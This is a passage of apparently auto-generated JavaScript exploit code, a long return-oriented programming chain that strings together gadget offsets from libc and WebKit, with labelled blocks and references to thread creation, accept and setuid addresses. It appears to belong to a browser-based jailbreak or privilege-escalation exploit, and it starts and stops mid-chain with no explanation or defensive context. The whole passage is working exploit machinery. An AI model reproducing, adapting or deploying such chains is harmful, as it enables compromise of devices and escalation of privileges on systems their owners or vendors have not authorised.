//L3168:
libc_base+768796 //pop rax
]);
//L3447:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3448:
ropchain+174016, //_sender_thread
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L3449:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+212568, //L3451
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3450:
db([4294965192, 4294967295]); // -0x838
set_gadget(libc_base+768796,); //pop rax
//L3451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3453:
ropchain+212680, //L3452
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+148944, //_pthread_create__rop
//L3452:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+212768, //L3455
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3454:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L3455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+212872, //L3458
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+212856, //L3457
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3457:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3458:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+213016, //L3462
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+212984, //L3460
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+213000, //L3461
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3460:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3461:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3462:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3464:
ropchain+213120, //L3463
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+216600, //L3465
//L3463:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+213224, //L3468
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L3466:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3467:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3468:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+213336, //L3469
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+213368, //L3471
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+213352, //L3470
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3469:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3470:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+213472, //L3472
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+213488, //L3473
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L3472:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+213608, //L3474
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+213592, //L3475
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L3475:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L3474:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+213696, //L3477
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+213680, //L3476
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3476:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+213800, //L3478
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+213816, //L3479
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L3478:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3479:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+213936, //L3480
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+213920, //L3481
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L3481:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L3480:
db([0, 0]); // 0x0
//L3266:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
accept_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+215264, //L3482
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3482:
db([0, 0]); // 0x0
//L2932:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
setuid_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+216592, //L3483
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3483:
db([0, 0]); // 0x0
//L3465:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+508174, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+217968, //L3484
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3484:
